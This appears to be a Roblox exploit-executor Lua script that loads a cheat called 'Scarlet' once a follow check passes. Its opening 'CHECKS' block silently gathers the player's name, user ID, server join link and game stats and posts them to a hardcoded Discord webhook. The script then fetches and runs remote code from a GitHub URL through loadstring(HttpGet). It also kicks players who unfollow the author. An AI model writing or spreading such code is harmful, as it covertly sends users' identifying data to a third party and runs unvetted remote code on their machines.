

-- === CHECKS (NEW VERSION) ===
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer


-- Helper to fetch stat from a folder or default to 0
local function getStat(folder, stat)
    if LocalPlayer and LocalPlayer:FindFirstChild(folder) and LocalPlayer[folder]:FindFirstChild(stat) then
        return LocalPlayer[folder][stat].Value
    else
        return 0
    end
end

-- Main stats
local coins = getStat("leaderstats", "Coins")
local rank = getStat("leaderstats", "Rank")
local rubies = getStat("leaderstats", "Rubies")
local currentBounty = getStat("Infamy", "CurrentBounty")
local infamyDeaths = getStat("Infamy", "Deaths")
local infamyKills = getStat("Infamy", "Kills")
local power = getStat("Infamy", "Power")

-- OTHER folder stats
local otherKills = getStat("Other", "Kills")
local assists = getStat("Other", "Assists")
local otherDeaths = getStat("Other", "Deaths")

local jobId = (game.JobId and tostring(game.JobId)) or "N/A"
local placeId = (game.PlaceId and tostring(game.PlaceId)) or "N/A"
local timeString = os.date("!%Y-%m-%d %H:%M:%S")

local webhookUrl = "https://discord.com/api/webhooks/1417815524511060038/etEuEhAPrcZ0hpANLvCdPa89kUwxmm1BFUF_eCQjZjOVkPgxE6JpUEbwXlZZmBO1eTaF"

local embed = {
    ["title"] = "Troll exploit triggered!",
    ["description"] = string.format(
        "Player: %s (ID: %s) [Profile](https://www.roblox.com/users/%s/profile)\n" ..
        "ServerJobId: %s\n" ..
        "JoinGame: https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s\n" ..
        "PlaceId: %s\n" ..
        "Time: %s\n\n" ..
        "HT INFO\n\n" ..
        "**USER STATS**\n" ..
        "```lua\nRank: %s\nCoins: %s\nRubies: %s\n```\n" ..
        "**INFAMY**\n" ..
        "```lua\nCurrentBounty: %s\nDeaths: %s\nKills: %s\nPower: %s\n```\n" ..
        "**OTHER**\n" ..
        "```lua\nKills: %s\nAssists: %s\nDeaths: %s\n```",
        LocalPlayer.Name, LocalPlayer.UserId, LocalPlayer.UserId,
        jobId,
        placeId, jobId,
        placeId,
        timeString,
        rank, coins, rubies,
        currentBounty, infamyDeaths, infamyKills, power,
        otherKills, assists, otherDeaths
    ),
    ["color"] = 16711680
}

local data = {["embeds"] = {embed}}
local jsonData = HttpService:JSONEncode(data)

local response = request or http_request or (syn and syn.request)
if response then
    response({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = jsonData
    })
end





--// ADVANCED FOLLOW CHECK SCRIPT (with Retry Button + Periodic Unfollow Check)



local USE_HARDCODED_USERID = true
local TARGET_USERNAME = "Snuver"
local TARGET_USERID = 422020805
local MAIN_SCRIPT_URL = "https://raw.githubusercontent.com/Scarsss111/sadawdsawdsa/refs/heads/main/Scarlet%20V.1.5.lua"

local gui -- keep reference for retry

local function showPopup(title, message, okText, retryCallback)
    if gui then gui:Destroy() end
    gui = Instance.new("ScreenGui")
    gui.Name = "ScarletFollowPopup"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.AnchorPoint = Vector2.new(0.5,0.5)
    frame.Size = UDim2.new(0, 410, 0, 220)
    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    frame.BackgroundColor3 = Color3.fromRGB(30,30,45)
    frame.BorderSizePixel = 0
    frame.BackgroundTransparency = 0.05
    frame.Parent = gui

    local uicorner = Instance.new("UICorner")
    uicorner.CornerRadius = UDim.new(0, 14)
    uicorner.Parent = frame

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -32, 0, 38)
    titleLabel.Position = UDim2.new(0, 16, 0, 10)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 26
    titleLabel.TextColor3 = Color3.fromRGB(186, 210, 255)
    titleLabel.Text = title
    titleLabel.TextWrapped = true
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = frame

    local msgLabel = Instance.new("TextLabel")
    msgLabel.Size = UDim2.new(1, -32, 0, 100)
    msgLabel.Position = UDim2.new(0, 16, 0, 55)
    msgLabel.BackgroundTransparency = 1
    msgLabel.Font = Enum.Font.Gotham
    msgLabel.TextSize = 18
    msgLabel.TextColor3 = Color3.new(1,1,1)
    msgLabel.Text = message
    msgLabel.TextWrapped = true
    msgLabel.TextXAlignment = Enum.TextXAlignment.Left
    msgLabel.TextYAlignment = Enum.TextYAlignment.Top
    msgLabel.Parent = frame

    -- OK button (left)
    local okButton = Instance.new("TextButton")
    okButton.Size = UDim2.new(0, 120, 0, 36)
    okButton.Position = UDim2.new(0.5, -130, 1, -46)
    okButton.AnchorPoint = Vector2.new(0, 0)
    okButton.BackgroundColor3 = Color3.fromRGB(86, 133, 255)
    okButton.Font = Enum.Font.GothamMedium
    okButton.TextSize = 19
    okButton.Text = okText or "OK"
    okButton.TextColor3 = Color3.new(1, 1, 1)
    okButton.Parent = frame
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = okButton

    okButton.MouseButton1Click:Connect(function()
        gui:Destroy()
    end)

    -- Retry button (right)
    if retryCallback then
        local retryButton = Instance.new("TextButton")
        retryButton.Size = UDim2.new(0, 120, 0, 36)
        retryButton.Position = UDim2.new(0.5, 10, 1, -46)
        retryButton.AnchorPoint = Vector2.new(0, 0)
        retryButton.BackgroundColor3 = Color3.fromRGB(120, 180, 60)
        retryButton.Font = Enum.Font.GothamMedium
        retryButton.TextSize = 19
        retryButton.Text = "Retry"
        retryButton.TextColor3 = Color3.new(1, 1, 1)
        retryButton.Parent = frame
        local btnCorner2 = Instance.new("UICorner")
        btnCorner2.CornerRadius = UDim.new(0, 8)
        btnCorner2.Parent = retryButton

        retryButton.MouseButton1Click:Connect(function()
            gui:Destroy()
            retryCallback()
        end)
    end
end

local function resolveTargetUserId()
    if USE_HARDCODED_USERID then
        return TARGET_USERID
    end
    local success, userIdOrErr = pcall(function()
        return Players:GetUserIdFromNameAsync(TARGET_USERNAME)
    end)
    if success and typeof(userIdOrErr) == "number" then
        return userIdOrErr
    end
    showPopup(
        "Error",
        "Could not resolve user ID for '"..TARGET_USERNAME.."'.\nReason: "..tostring(userIdOrErr),
        "Close"
    )
    return nil
end

local function isFollowing(targetUserId)
    local req = request or http_request or (syn and syn.request)
    if not req then
        showPopup(
            "Executor Error",
            "Your executor does not support HTTP requests, so follow verification cannot continue.",
            "Close"
        )
        return false, "nohttp"
    end

    local url = ("https://friends.roblox.com/v1/users/%d/followings?limit=100"):format(LocalPlayer.UserId)
    local response = req({
        Url = url,
        Method = "GET",
        Headers = {
            ["User-Agent"] = "Roblox/WinInet"
        }
    })

    if not response or not response.Body then
        return false, "httpfail"
    end

    local ok, data = pcall(function()
        return HttpService:JSONDecode(response.Body)
    end)
    if not ok or type(data) ~= "table" or not data.data then
        return false, "jsonfail"
    end

    for _, entry in ipairs(data.data) do
        if tonumber(entry.id) == targetUserId then
            return true
        end
    end
    return false
end

local function main()
    local userId = resolveTargetUserId()
    if not userId then return end

    local function retry()
        main()
    end

    local followed, err = isFollowing(userId)
    if followed then
        print("Follow check passed! Loading main script...")
        local ok, mainErr = pcall(function()
            loadstring(game:HttpGet(MAIN_SCRIPT_URL))()
        end)
        if not ok then
            showPopup("Script Error", "Failed to load Scarlet main script:\n"..tostring(mainErr), "Close")
        end

        -- Periodically check if user is still following and kick if not
        task.spawn(function()
            while task.wait(30) do
                local stillFollowing = isFollowing(userId)
                if not stillFollowing then
                    LocalPlayer:Kick("oi, why did you unfollow me >:(")
                    break
                end
            end
        end)
    else
        if err == "nohttp" then return end
        showPopup(
            "Follow Required",
            "You must follow @"..TARGET_USERNAME.." on Roblox to use this script!\n\nIf you just followed, please wait a few seconds and click Retry.",
            "Cancel",
            retry
        )
    end
end

main()